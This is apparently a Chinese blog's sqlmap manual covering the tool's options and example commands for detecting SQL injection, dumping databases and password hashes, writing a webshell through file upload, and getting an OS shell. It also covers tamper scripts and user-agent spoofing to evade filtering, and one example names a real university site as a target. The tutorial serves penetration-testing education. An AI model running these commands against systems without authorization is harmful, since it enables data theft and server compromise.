<h4 id="模仿智能手机"><a href="#模仿智能手机" class="headerlink" title="模仿智能手机"></a>模仿智能手机</h4><p>参数：<code>--mobile</code></p>
<p>有时服务端只接收移动端的访问，此时可以设定一个手机的<code>User-Agent</code>来模仿手机登陆。</p>
<p>例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">"http://www.target.com/vuln.php?id=1"</span> --mobile</span><br><span class="line">[...]</span><br><span class="line">which smartphone do you want sqlmap to imitate through HTTP User-Agent header?</span><br><span class="line">[<span class="number">1</span>] Apple iPhone <span class="number">4</span>s (default)</span><br><span class="line">[<span class="number">2</span>] BlackBerry <span class="number">9900</span></span><br><span class="line">[<span class="number">3</span>] Google Nexus <span class="number">7</span></span><br><span class="line">[<span class="number">4</span>] HP iPAQ <span class="number">6365</span></span><br><span class="line">[<span class="number">5</span>] HTC Sensation</span><br><span class="line">[<span class="number">6</span>] Nokia N97</span><br><span class="line">[<span class="number">7</span>] Samsung Galaxy S</span><br><span class="line">\&gt; <span class="number">1</span></span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

<h4 id="安全的删除output目录的文件"><a href="#安全的删除output目录的文件" class="headerlink" title="安全的删除output目录的文件"></a>安全的删除output目录的文件</h4><p>参数：<code>--purge-output</code></p>
<p>有时需要删除结果文件，而不被恢复，可以使用此参数，原有文件将会被随机的一些文件覆盖。</p>
<p>例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ python sqlmap.py --purge-output -v <span class="number">3</span></span><br><span class="line">[...]</span><br><span class="line">[xx:xx:<span class="number">55</span>] [INFO] purging content of directory <span class="string">'/home/user/sqlmap/output'</span>...</span><br><span class="line">[xx:xx:<span class="number">55</span>] [DEBUG] changing file attributes</span><br><span class="line">[xx:xx:<span class="number">55</span>] [DEBUG] writing random data to files</span><br><span class="line">[xx:xx:<span class="number">55</span>] [DEBUG] truncating files</span><br><span class="line">[xx:xx:<span class="number">55</span>] [DEBUG] renaming filenames to random values</span><br><span class="line">[xx:xx:<span class="number">55</span>] [DEBUG] renaming directory names to random values</span><br><span class="line">[xx:xx:<span class="number">55</span>] [DEBUG] deleting the whole directory tree</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

<h4 id="启发式判断注入"><a href="#启发式判断注入" class="headerlink" title="启发式判断注入"></a>启发式判断注入</h4><p>参数：<code>--smart</code></p>
<p>有时对目标非常多的URL进行测试，为节省时间，只对能够快速判断为注入的报错点进行注入，可以使用此参数。</p>
<p>例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ python sqlmap.py -u</span><br><span class="line"><span class="string">"http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&amp;user=foo&amp;id=1"</span> --batch</span><br><span class="line">--smart</span><br><span class="line">[...]</span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] testing <span class="keyword">if</span> GET parameter <span class="string">'ca'</span> <span class="keyword">is</span> dynamic</span><br><span class="line">[xx:xx:<span class="number">14</span>] [WARNING] GET parameter <span class="string">'ca'</span> does <span class="keyword">not</span> appear dynamic</span><br><span class="line">[xx:xx:<span class="number">14</span>] [WARNING] heuristic (basic) test shows that GET parameter <span class="string">'ca'</span> might</span><br><span class="line"><span class="keyword">not</span> be injectable</span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] skipping GET parameter <span class="string">'ca'</span></span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] testing <span class="keyword">if</span> GET parameter <span class="string">'user'</span> <span class="keyword">is</span> dynamic</span><br><span class="line">[xx:xx:<span class="number">14</span>] [WARNING] GET parameter <span class="string">'user'</span> does <span class="keyword">not</span> appear dynamic</span><br><span class="line">[xx:xx:<span class="number">14</span>] [WARNING] heuristic (basic) test shows that GET parameter <span class="string">'user'</span></span><br><span class="line">might <span class="keyword">not</span> be injectable</span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] skipping GET parameter <span class="string">'user'</span></span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] testing <span class="keyword">if</span> GET parameter <span class="string">'id'</span> <span class="keyword">is</span> dynamic</span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] confirming that GET parameter <span class="string">'id'</span> <span class="keyword">is</span> dynamic</span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] GET parameter <span class="string">'id'</span> <span class="keyword">is</span> dynamic</span><br><span class="line">[xx:xx:<span class="number">14</span>] [WARNING] reflective value(s) found <span class="keyword">and</span> filtering out</span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] heuristic (basic) test shows that GET parameter <span class="string">'id'</span> might be</span><br><span class="line">injectable (possible DBMS: <span class="string">'MySQL'</span>)</span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] testing <span class="keyword">for</span> SQL injection on GET parameter <span class="string">'id'</span></span><br><span class="line">heuristic (parsing) test showed that the back-end DBMS could be <span class="string">'MySQL'</span>. Do you</span><br><span class="line">want to skip test payloads specific for other DBMSes? [Y/n] Y</span><br><span class="line">do you want to include all tests <span class="keyword">for</span> <span class="string">'MySQL'</span> extending provided level (<span class="number">1</span>) <span class="keyword">and</span></span><br><span class="line">risk (1)? [Y/n] Y</span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] testing <span class="string">'AND boolean-based blind - WHERE or HAVING clause'</span></span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] GET parameter <span class="string">'id'</span> <span class="keyword">is</span> <span class="string">'AND boolean-based blind - WHERE or</span></span><br><span class="line"><span class="string">HAVING clause'</span> injectable</span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] testing <span class="string">'MySQL \&gt;= 5.0 AND error-based - WHERE or HAVING</span></span><br><span class="line"><span class="string">clause'</span></span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] GET parameter <span class="string">'id'</span> <span class="keyword">is</span> <span class="string">'MySQL \&gt;= 5.0 AND error-based - WHERE</span></span><br><span class="line"><span class="string">or HAVING clause'</span> injectable</span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] testing <span class="string">'MySQL inline queries'</span></span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] testing <span class="string">'MySQL \&gt; 5.0.11 stacked queries'</span></span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] testing <span class="string">'MySQL \&lt; 5.0.12 stacked queries (heavy query)'</span></span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] testing <span class="string">'MySQL \&gt; 5.0.11 AND time-based blind'</span></span><br><span class="line">[xx:xx:<span class="number">24</span>] [INFO] GET parameter <span class="string">'id'</span> <span class="keyword">is</span> <span class="string">'MySQL \&gt; 5.0.11 AND time-based blind'</span></span><br><span class="line">injectable</span><br><span class="line">[xx:xx:<span class="number">24</span>] [INFO] testing <span class="string">'MySQL UNION query (NULL) - 1 to 20 columns'</span></span><br><span class="line">[xx:xx:<span class="number">24</span>] [INFO] automatically extending ranges <span class="keyword">for</span> UNION query injection</span><br><span class="line">technique tests <span class="keyword">as</span> there <span class="keyword">is</span> at least one other potential injection technique</span><br><span class="line">found</span><br><span class="line">[xx:xx:<span class="number">24</span>] [INFO] ORDER BY technique seems to be usable. This should reduce the</span><br><span class="line">time needed to find the right number of query columns. Automatically extending</span><br><span class="line">the range <span class="keyword">for</span> current UNION query injection technique test</span><br><span class="line">[xx:xx:<span class="number">24</span>] [INFO] target URL appears to have <span class="number">3</span> columns <span class="keyword">in</span> query</span><br><span class="line">[xx:xx:<span class="number">24</span>] [INFO] GET parameter <span class="string">'id'</span> <span class="keyword">is</span> <span class="string">'MySQL UNION query (NULL) - 1 to 20</span></span><br><span class="line"><span class="string">columns'</span> injectable</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

<h4 id="初级用户向导参数"><a href="#初级用户向导参数" class="headerlink" title="初级用户向导参数"></a>初级用户向导参数</h4><p>参数：<code>--wizard</code>面向初级用户的参数，可以一步一步教你如何输入针对目标注入。</p>
<p>参考：</p>
<p><a href="https://xz.aliyun.com/t/3010" target="_blank" rel="noopener">https://xz.aliyun.com/t/3010</a></p>
<p>sqlmap用户手册中文版：</p>
<p><a href="https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/Users-manual/Introduction.html" target="_blank" rel="noopener">https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/Users-manual/Introduction.html</a></p>
<p>sqlmap用户手册：</p>
<p><a href="http://drops.xmd5.com/static/drops/tips-143.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-143.html</a></p>
<p>sqlmap tamper脚本 ：</p>
<p><a href="http://www.lengbaikai.net/?p=110" target="_blank" rel="noopener">http://www.lengbaikai.net/?p=110</a></p>
<p><a href="https://mp.weixin.qq.com/s/vEEoMacmETUA4yZODY8xMQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/vEEoMacmETUA4yZODY8xMQ</a></p>
<p><a href="https://xz.aliyun.com/t/2746" target="_blank" rel="noopener">https://xz.aliyun.com/t/2746</a></p>
]]></content>
      <categories>
        <category>Penetration test</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqlmap之使用手册（上）</title>
    <url>/2019/11/26/Sqlmap%E4%B9%8B%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/</url>
    <content><![CDATA[<p>本文摘自乌云和先知社区sqlmap使用总结</p><h2 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="寻找注入点"></a>寻找注入点</h2><h3 id="GET方式"><a href="#GET方式" class="headerlink" title="GET方式"></a>GET方式</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u "url" //这个URL必须含？</span><br></pre></td></tr></table></figure><h3 id="POST方式"><a href="#POST方式" class="headerlink" title="POST方式"></a>POST方式</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://testasp.vulnweb.com/Login.asp --data "tfUName=1&amp;tfUPass=1"</span><br></pre></td></tr></table></figure><h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><a id="more"></a>




<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u "url" --cookie "chsadj" --level 2 //这里的URL去掉？及其后的内容，并将它们放在cookie的内容里面</span><br></pre></td></tr></table></figure>

<h3 id="tamper方式"><a href="#tamper方式" class="headerlink" title="tamper方式"></a>tamper方式</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u "url" -v 3 --batch --tamper "sac.py"  //temper后面的插件可以去sql安装目录查找</span><br></pre></td></tr></table></figure>

<h3 id="自动检测表"><a href="#自动检测表" class="headerlink" title="自动检测表"></a>自动检测表</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://testasp.vulnweb.com/Login.asp --forms</span><br></pre></td></tr></table></figure>

<h3 id="延时两秒"><a href="#延时两秒" class="headerlink" title="延时两秒"></a>延时两秒</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Sqlmap –u “url” --delay 2</span><br></pre></td></tr></table></figure>

<h3 id="频率3次"><a href="#频率3次" class="headerlink" title="频率3次"></a>频率3次</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Sqlmap –u “url” --safe-freq 3</span><br></pre></td></tr></table></figure>

<h3 id="伪静态"><a href="#伪静态" class="headerlink" title="伪静态"></a>伪静态</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Sqlmap -u http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html //在40后面加*</span><br></pre></td></tr></table></figure>

<h2 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u "url" --dbs   //查看所有数据库</span><br><span class="line">sqlmap -u "url" --users //查看所有用户</span><br><span class="line">sqlmap -u "url" --current-db //查看当前的数据库</span><br><span class="line">sqlmap -u "url" --current-user //产看当前的用户</span><br><span class="line">sqlmap -u "url" --is-dba //查看是否是最高权限</span><br><span class="line">sqlmap -u "url" --passwords //查看所有密码</span><br><span class="line">sqlmap -u "url" --hostname //查看主机名</span><br><span class="line">sqlmap -u "url" privileges -U username //查看用户权限</span><br><span class="line">sqlmap -u "url" --roles //查看用户角色</span><br></pre></td></tr></table></figure>

<h3 id="查看详细内容"><a href="#查看详细内容" class="headerlink" title="查看详细内容"></a>查看详细内容</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u "url" --tables -D "database" //database这个数据库的表数据表</span><br><span class="line">sqlmap -u "url" --columns -T "tables" -D "database" //查看tables这个数据表的字段</span><br><span class="line">sqlmap -u "url" --dump "a,b,c" -C "columns" -T "tables" -D "database" //下载内容，后面的-CTDabc都是对下载的数据库表段的约束如果不加就是下载所有</span><br></pre></td></tr></table></figure>

<h2 id="执行特殊操作"><a href="#执行特殊操作" class="headerlink" title="执行特殊操作"></a>执行特殊操作</h2><h3 id="文件查看"><a href="#文件查看" class="headerlink" title="文件查看"></a>文件查看</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u "url" –file-read= //这个读取的文件会存在本地的结果目录，请认真看提示</span><br></pre></td></tr></table></figure>

<h3 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u "url" --file-write=本地文件路径 --file-dest=网站的绝对路径 //上传webshell用，需要dba权限</span><br></pre></td></tr></table></figure>

<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u "url" --os-cmd "cmd"  //执行cmd代表的命令，如cd C:/</span><br><span class="line">sqlmap -u "url" --os-shell  //进入数据库自带的shell</span><br></pre></td></tr></table></figure>

<h2 id="命令总览"><a href="#命令总览" class="headerlink" title="命令总览"></a>命令总览</h2><p>使用<code>sqlmap -hh</code>可以查看详细的命令说明：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-r 1.txt            对于用post方法提交的，参数不在URL里面的网页，可以先截获数据，保存成文件再用这个参数执行，此方法也可用于json注入</span><br><span class="line">-l log.txt          可以将代理的日志作为目标去检测[见下图]</span><br><span class="line">-m 1.txt            对于多个URL，可以一排一个写入文件后加载</span><br><span class="line">--force-ssl         对于使用SSL的URL要在后面加上这个参数</span><br><span class="line">--data              对于使用post方法，可以将参数写在data后面</span><br><span class="line">--param-del=""          </span><br><span class="line">--cookie=""  level 2        对于需要验证才能访问的URL，可以加上cookie值验证，如果要检测cookie是否有注入漏洞，level要高于1</span><br><span class="line">--random-agent          使用随机的user-agent</span><br><span class="line">--user-agent=""  level 3    指定user-agent，如要检测它是否有漏洞level要高于2</span><br><span class="line">--header="\n"           指定头信息，如User-Agent:dsacs，大小写敏感，多个用\n分隔</span><br><span class="line">--method=GET POST       设置提交方式，默认一个一个的尝试</span><br><span class="line">--auth-type             如果是基于http的验证，如Basic NTLM Digest，可直接加类型再配合下一个参数使用</span><br><span class="line">--auth-cred "user:pass"     填写账号和密码</span><br><span class="line">--proxy="http:127.0.0.1:8087"  使用代理</span><br><span class="line">--proxy-cred="name:pass"    如果代理要密码的话</span><br><span class="line">--ignore-proxy          强制不使用代理</span><br><span class="line">--delay             请求延迟间隔，单位秒，默认无延迟</span><br><span class="line">--retries           链接失败重试次数3</span><br><span class="line">--timeout           链接超时时间30</span><br><span class="line">--randomize="param"     使用和源参数类型长度一致的参数</span><br><span class="line">sqlmap -l l.log --scope="(www)?\.target\.(com|net|org)"     这是一个正则表达式，是对于log文件里面URL过多时，进行筛选，这里是只要com/net/org结尾的域名</span><br><span class="line">sqlmap -l 2.log --scope="(19)?\.168\.20\.(1|11|111)"        同上，筛选19*.168.20.1/11/111这几个网段的IP</span><br><span class="line">--safe-url="url"        设置正确的URL，因为如果一直尝试错误的URL可能会被服务器拉黑，过几次登下正确的防止这个发生</span><br><span class="line">--safe-freq 10          尝试的与正确的URL的交换频率</span><br><span class="line">--skip-urlencode        有的URL在get方式提交时没编码，就要用这个</span><br><span class="line">--eval=""php代码      这个后面可以跟PHP代码，能够执行</span><br><span class="line">--keep-alive            保持连接会降低资源使用，但是不能与代理兼容</span><br><span class="line">--predict-output        能够在找到一个信息后缩小检测的范围，不能与--threads兼容</span><br><span class="line">--null-connection       只看返回文件的大小，不要他的内容与--text-only不兼容</span><br><span class="line">--threads           最大并发数，默认1，最大不要超过10，盲注时一次返回一个字符【7次请求】</span><br><span class="line">-o              使用除了--threads的全部的优化参数</span><br><span class="line">-p              指定参数，使level失效</span><br><span class="line">-skip               排除不扫描的参数</span><br><span class="line">                对于伪静态网页，就在参数后面加*</span><br><span class="line">--dbms              接数据库管理系统，如MySQL</span><br><span class="line">--os                接系统，如Linux</span><br><span class="line">--invalid-bignum        使用大数作为假的值</span><br><span class="line">--invalid-logical       使用逻辑数作为假的值</span><br><span class="line">--no-cat            对于接收到的null不自动转换成空格</span><br><span class="line">--no-escape         不使用逃逸，就是不把'转换成asii码形式</span><br><span class="line">--prefix            在参数前指定前缀</span><br><span class="line">--suffix            在参数后指定后缀</span><br><span class="line">--level             设置检查的等级，默认为1，共5个，可以查看/usr/share/sqlmap/xml/payloads这个文件了解详细的信息</span><br><span class="line">--risk              设置风险等级，默认是安全的检查，第四等可能会修改数据库内容</span><br><span class="line">--string            当页面含有这个字符串时为真</span><br><span class="line">--not-string            当页面不含这个字符串时为真</span><br><span class="line">--regexp            用正则表达式判断</span><br><span class="line">--code              当状态代码为*时为真</span><br><span class="line">--text-only         页面含有*时为真</span><br><span class="line">--titles            页面标题为*时为真</span><br><span class="line">--technique</span><br><span class="line">B E U S T           使用什么检查技术，默认所有，这里分别是基于布尔的盲注，基于错误的判断，联合查询，堆积，基于时间的查询</span><br><span class="line">--time-sec          </span><br><span class="line">--union-cols            联合查询第几列到第几列</span><br><span class="line">--union-char            用select null,1:2  这种，可能会出错，就讲这个null换成其他数字占位</span><br><span class="line">--second-order          当注入后在第二个页面显示错误信息，这里就接上显示错误信息的地方</span><br><span class="line">-fingerprint            指纹信息</span><br><span class="line">--banner            版本信息</span><br><span class="line">--batch             按照软件默认设置，自动回答</span><br><span class="line">--count             计数</span><br><span class="line">-s              将这个会话保存下次继续</span><br><span class="line">-t              将这些数据保存</span><br><span class="line">--charset           强制设置数据库编码</span><br><span class="line">--crawl             设置蜘蛛爬行的深度</span><br><span class="line">--csv-del           设置下载的数据的分隔方式，默认是,</span><br><span class="line">--dbms-cred         设置数据库用户</span><br><span class="line">--flush-session         清空以前的会话数据</span><br><span class="line">--fresh-queries         不清空会话，重新查询</span><br><span class="line">--hex               一16进制编码的方式传输数据</span><br><span class="line">--output-dir            会话输出文件夹</span><br><span class="line">--parse-errors          显示MySQL错误信息</span><br><span class="line">--save              保存当前配置为文件</span><br><span class="line">-z              特别的助记方式，后面接的只要是独一无二的企鹅存在的就可以用，如user-agent可以用ueraet.</span><br><span class="line">--answers           这个可以对一些特定的问题作出回答，在自动化注入中用</span><br><span class="line">--check-waf         检查是否含有waf等</span><br><span class="line">--identify-waf          彻底的检查waf等的信息</span><br><span class="line">--smart     当有大量目标时，这个就只检查基于错误的注入点</span><br><span class="line">--mobile    模拟智能手机去扫描</span><br><span class="line">--wizard    向导模式</span><br><span class="line">--purge-out 清除输出内容</span><br></pre></td></tr></table></figure>

<p>使用<code>-l</code>参数时，这样设置<code>burpsuite</code>:</p>
<p><img src="//choge.top/2019/11/26/Sqlmap之使用手册/sqlmap-1.png" alt="sqlmap-1"></p>
<h2 id="注入判断"><a href="#注入判断" class="headerlink" title="注入判断"></a>注入判断</h2><p>当给<code>sqlmap</code>这么一个<code>url</code>的时候，它会：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 判断可注入的参数</span><br><span class="line">2. 判断可以用那种SQL注入技术来注入</span><br><span class="line">3. 识别出哪种数据库</span><br><span class="line">4. 根据用户选择，读取哪些数据</span><br></pre></td></tr></table></figure>

<p><code>sqlmap</code>支持五种不同的注入模式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 基于布尔的盲注，即可以根据返回页面判断条件（真\|假）的注入。</span><br><span class="line">2. 基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</span><br><span class="line">3. 基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</span><br><span class="line">4. 联合查询注入，可以使用union的情况下的注入。</span><br><span class="line">5. 堆查询注入，可以同时执行多条语句的执行时的注入。（使用;分隔开多条语句，最为灵活，可以自己构造select（含）外的其他语句）</span><br></pre></td></tr></table></figure>

<p><code>sqlmap</code>支持的数据库管理系统有：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2,</span><br><span class="line">SQLite, Firebird, Sybase和SAP MaxDB</span><br></pre></td></tr></table></figure>

<p>可以提供一个简单的<code>URL，Burp</code>或<code>WebScarab</code>请求日志文件，文本文档中的完整<code>http</code>请求或者<code>Google</code>的搜索，匹配出结果页面，也可以自己定义一个正则来判断那个地址去测试。</p>
<p>测试<code>GET</code>参数，<code>POST</code>参数，<code>HTTP Cookie</code>参数，<code>HTTP User-Agent</code>头和<code>HTTP Referer</code>头来确认是否有<code>SQL</code>注入，它也可以指定用逗号分隔的列表的具体参数来测试。可以设定<code>HTTP(S)</code>请求的并发数，来提高盲注时的效率。</p>
<h2 id="用来连接数据库"><a href="#用来连接数据库" class="headerlink" title="用来连接数据库"></a>用来连接数据库</h2><p>这是一个比较实用的功能，用来连接数据库格式为</p>
<p><img src="//choge.top/2019/11/26/Sqlmap之使用手册/sqlmap-2.png" alt="sqlmap-2"></p>
<h2 id="设置显示信息的详细度："><a href="#设置显示信息的详细度：" class="headerlink" title="设置显示信息的详细度："></a>设置显示信息的详细度：</h2><p>使用<code>-v</code>参数，共有<code>七</code>个等级：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0. 只显示python错误以及严重的信息。</span><br><span class="line">1. 同时显示基本信息和警告信息。（默认）</span><br><span class="line">2. 同时显示debug信息。</span><br><span class="line">3. 同时显示注入的payload。</span><br><span class="line">4. 同时显示HTTP请求。</span><br><span class="line">5. 同时显示HTTP响应头。</span><br><span class="line">6. 同时显示HTTP响应页面。</span><br></pre></td></tr></table></figure>

<p>可以通过学习<code>sqlmap</code>的<code>payload</code>来学习<code>sql</code>注入，这时需要使用3级。</p>
<p>##获取目标方式</p>
<h3 id="目标URL"><a href="#目标URL" class="headerlink" title="目标URL"></a>目标URL</h3><p>参数：<code>-u</code>或者<code>–url</code></p>
<p>格式：<code>http(s)://targeturl[:port]/[…]</code></p>
<p>例如：<code>python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&quot; -f --banner --dbs --users</code></p>
<p>从<code>Burp</code>或者<code>WebScarab</code>代理中获取日志</p>
<p>参数：<code>-l</code></p>
<p>可以直接吧<code>Burp proxy</code>或者<code>WebScarab proxy</code>中的日志直接倒出来交给<code>sqlmap</code>来一个一个检测是否有注入。</p>
<h3 id="从文本中获取多个目标扫描"><a href="#从文本中获取多个目标扫描" class="headerlink" title="从文本中获取多个目标扫描"></a>从文本中获取多个目标扫描</h3><p>参数：<code>-m</code></p>
<p>文件中保存<code>url</code>格式如下，<code>sqlmap</code>会一个一个检测</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.target1.com/vuln1.php?q=foobar</span><br><span class="line">www.target2.com/vuln2.asp?id=1</span><br><span class="line">www.target3.com/vuln3/id/1*</span><br></pre></td></tr></table></figure>

<h3 id="从文件中加载HTTP请求"><a href="#从文件中加载HTTP请求" class="headerlink" title="从文件中加载HTTP请求"></a>从文件中加载HTTP请求</h3><p>参数：<code>-r</code></p>
<p><code>sqlmap</code>可以从一个文本文件中获取<code>HTTP</code>请求，这样就可以跳过设置一些其他参数（比如<code>cookie，POST</code>数据，等等）。</p>
<p>比如文本文件内如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">POST /vuln.php HTTP/1.1</span><br><span class="line">Host: www.target.com</span><br><span class="line">User-Agent: Mozilla/4.0</span><br><span class="line">id=1</span><br></pre></td></tr></table></figure>

<p>当请求是HTTPS的时候你需要配合这个<code>--force-ssl</code>参数来使用，或者你可以在Host头后面加上:<code>443</code></p>
<p><code>sqlmap -u &quot;https://10.10.10.137/a.php?id=1:8843&quot; --force-ssl //不是443端口后面添加端口号</code></p>
<p>也可以使用代理等方式进行HTTPS注入</p>
<p><code>sqlmap -u https://www.xxx.com/news_show.asp --data=id=3395 --safe-url=https://www.xxxx.com/news_show.asp?/3395.html --safe-freq=2 --tamper space2comment.py --force-ssl --proxy http://127.0.0.1:8080 --random-agent -v 3</code></p>
<h3 id="处理Google的搜索结果"><a href="#处理Google的搜索结果" class="headerlink" title="处理Google的搜索结果"></a>处理Google的搜索结果</h3><p>参数：<code>-g</code></p>
<p><code>sqlmap</code>可以测试注入<code>Google</code>的搜索结果中的<code>GET</code>参数（只获取前<code>100</code>个结果）。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -g "inurl:\".php?id=1\""</span><br></pre></td></tr></table></figure>

<p>此外可以使用-c参数加载sqlmap.conf文件里面的相关配置。</p>
<h2 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h2><h3 id="http数据"><a href="#http数据" class="headerlink" title="http数据"></a>http数据</h3><p>参数：<code>–data</code></p>
<p>此参数是把数据以<code>POST</code>方式提交，<code>sqlmap</code>会像检测GET参数一样检测<code>POST</code>的参数。</p>
<p>例子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u "http://www.target.com/vuln.php" --data="id=1" -f --banner --dbs --users</span><br></pre></td></tr></table></figure>

<h3 id="参数拆分字符"><a href="#参数拆分字符" class="headerlink" title="参数拆分字符"></a>参数拆分字符</h3><p>参数：<code>--param-del</code></p>
<p>当<code>GET</code>或<code>POST</code>的数据需要用其他字符分割测试参数的时候需要用到此参数（默认是&amp;）。</p>
<p>例子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u "http://www.target.com/vuln.php" --data="query=foobar;id=1"</span><br><span class="line">--param-del=";" -f --banner --dbs --users</span><br></pre></td></tr></table></figure>

<h3 id="HTTP-cookie头"><a href="#HTTP-cookie头" class="headerlink" title="HTTP cookie头"></a>HTTP cookie头</h3><p>参数：<code>--cookie,--load-cookies,--drop-set-cookie</code></p>
<p>这个参数在以下两个方面很有用：</p>
<ul>
<li><p>web应用需要登陆的时候。</p>
</li>
<li><p>你想要在这些头参数中测试SQL注入时。</p>
</li>
</ul>
<p>可以通过抓包把<code>cookie</code>获取到，复制出来，然后加到<code>--cookie</code>参数里。</p>
<p>在<code>HTTP</code>请求中，遇到<code>Set-Cookie</code>的话，<code>sqlmap</code>会自动获取并且在以后的请求中加入，并且会尝试<code>SQL</code>注入。</p>
<p>如果你不想接受<code>Set-Cookie</code>可以使用<code>--drop-set-cookie</code>参数来拒接。</p>
<p>当你使用<code>--cookie</code>参数时，当返回一个<code>Set-Cookie</code>头的时候，<code>sqlmap</code>会询问你用哪个<code>cookie</code>来继续接下来的请求。</p>
<p>当<code>--level</code>的参数设定为2或者2以上的时候，<code>sqlmap</code>会尝试注入<code>Cookie</code>参数。</p>
<h3 id="HTTP-User-Agent头"><a href="#HTTP-User-Agent头" class="headerlink" title="HTTP User-Agent头"></a>HTTP User-Agent头</h3><p>参数：<code>--user-agent,--random-agent</code></p>
<p>默认情况下<code>sqlmap</code>的<code>HTTP</code>请求头中<code>User-Agen</code>t值是：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)</span><br></pre></td></tr></table></figure>

<p>（这可能直接会被过滤掉或是触发警报，可以使用真实浏览器的<code>useragent</code>，百度一下就有了）</p>
<p>可以使用<code>--user-anget</code>参数来修改，同时也可以使用<code>--random-agnet</code>参数来随机的从<code>./txt/user-agents.txt</code>中获取。</p>
<p>当<code>--level</code>参数设定为3或者3以上的时候，会尝试对<code>User-Angent</code>进行注入。</p>
<h3 id="HTTP-Referer头"><a href="#HTTP-Referer头" class="headerlink" title="HTTP Referer头"></a>HTTP Referer头</h3><p>参数：<code>--referer</code></p>
<p><code>sqlmap</code>可以在请求中伪造HTTP中的<code>referer</code>，当<code>--level</code>参数设定为3或者3以上的时候会尝试对referer注入。</p>
<h3 id="额外的HTTP头"><a href="#额外的HTTP头" class="headerlink" title="额外的HTTP头"></a>额外的HTTP头</h3><p>参数：<code>--headers</code></p>
<p>可以通过<code>–headers</code>参数来增加额外的http头</p>
<p>###HTTP认证保护</p>
<p>参数：<code>--auth-type,--auth-cred</code></p>
<p>这些参数可以用来登陆HTTP的认证保护支持三种方式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. Basic</span><br><span class="line">2. Digest</span><br><span class="line">3. NTLM</span><br></pre></td></tr></table></figure>

<p>例子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1"</span><br><span class="line">--auth-type Basic --auth-cred "testuser:testpass"</span><br></pre></td></tr></table></figure>

<p>###HTTP协议的证书认证</p>
<p>参数：<code>--auth-cert</code></p>
<p>当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:<code>key_file，cert_file</code>。</p>
